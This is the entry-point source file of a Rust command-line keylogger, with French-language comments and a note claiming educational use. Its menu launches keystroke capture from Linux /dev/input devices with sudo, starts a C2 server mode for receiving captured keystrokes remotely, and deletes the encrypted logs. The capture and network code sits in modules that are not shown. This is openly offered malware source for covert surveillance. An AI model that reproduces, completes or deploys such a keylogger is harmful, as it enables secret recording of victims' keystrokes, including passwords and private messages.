mod config;
mod modules;

use modules::key_manager::get_or_create_key;
use std::io::{self, Write};
use clap::{Parser, Subcommand};
use colored::Colorize;
use inquire::Select;
use std::process::Command;
use std::env;

/// 🎯 Keylogger CLI — à usage éducatif uniquement
#[derive(Parser)]
#[command(name = "Keylogger")]
#[command(about = "Capture et chiffre les frappes clavier", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Menu interactif
    Start {
        #[arg(short, long, default_value = "auto")]
        device: String,
    },

    /// Lancement direct du keylogger (appelé par le menu)
    Run {
        #[arg(short, long, default_value = "auto")]
        device: String,
    },
}

fn main() {
    println!("{}", "  _  __          _                 ".yellow());
    println!("{}", " | |/ /___ _   _| | ___  ___ _ __  ".yellow());
    println!("{}", " | ' // _ \\ | | | |/ _ \\/ _ \\ '__| ".yellow());
    println!("{}", " | . \\  __/ |_| | |  __/  __/ |    ".yellow());
    println!("{}", " |_|\\_\\___|\\__,_|_|\\___|\\___|_|    ".yellow());
    println!();

    let cli = Cli::parse();

    match cli.command {
        Commands::Start { device: _ } => {
            let options = vec![
            	"Mode serveur C2",
                "Mode local test(/dev/input/)",
                "Supprimer les logs",
                "Quitter",
            ];

            let ans = Select::new("📋 Que veux-tu faire ?", options).prompt();

            match ans {
                Ok(choice) => match choice {
                    "Mode local test(/dev/input/)" => {
                        let current_path = std::env::current_dir().unwrap();
                        let binary_path = current_path.join("target/release/keylogger-rust");

                        Command::new("xterm")
                            .arg("-hold")
                            .arg("-e")
                            .arg("bash")
                            .arg("-c")
                            .arg(format!(
                                "sudo {} run --device=auto",
                                binary_path.to_string_lossy()
                            ))
                            .spawn()
                            .expect("❌ Erreur lancement keylogger device");
                    }

                    "Supprimer les logs" => {
                        let path = env::current_dir().unwrap().join("logs.enc");

                        if path.exists() {
                            let _ = std::fs::remove_file(&path);
                            println!("{}", "🧹 Logs supprimés !".green());
                        } else {
                            println!("{}", "❌ Aucun fichier de logs.".red());
                        }
                    }

                    "Mode serveur C2" => {
                        let current_path = std::env::current_dir().unwrap();
                        let binary_path = current_path.join("target/release/keylogger-rust");

                        Command::new("xterm")
                            .arg("-hold")
                            .arg("-e")
                            .arg("bash")
                            .arg("-c")
                            .arg(format!(
                                "{} run --device=c2server",
                                binary_path.to_string_lossy()
                            ))
                            .spawn()
                            .expect("❌ Erreur lancement mode serveur C2");
                    }

                    "Quitter" => {
                        println!("{}", "🚪 Fermeture du menu.".red());
                    }

                    _ => {}
                },
                Err(_) => println!("❌ Erreur dans le menu"),
            }
        }

        Commands::Run { device } => {
            let actual_device = if device == "auto" {
                modules::logger::detect_keyboard_device().expect("❌ Aucun clavier détecté.")
            } else {
                device.clone()
            };

            println!("{}", format!("[*] Keylogger démarré sur {}", actual_device).green());

            // ✅ Mode C2 server pour recevoir les frappes
            if actual_device == "c2server" {
                modules::network::start_server();
                return;
            }

            print!(" Entrez votre passphrase : ");
            io::stdout().flush().unwrap();

            let mut passphrase = String::new();
            io::stdin().read_line(&mut passphrase).unwrap();
            let passphrase = passphrase.trim();

            let _key = get_or_create_key(passphrase);

            modules::logger::start_keylogger(&actual_device, passphrase);
        }
    }
}
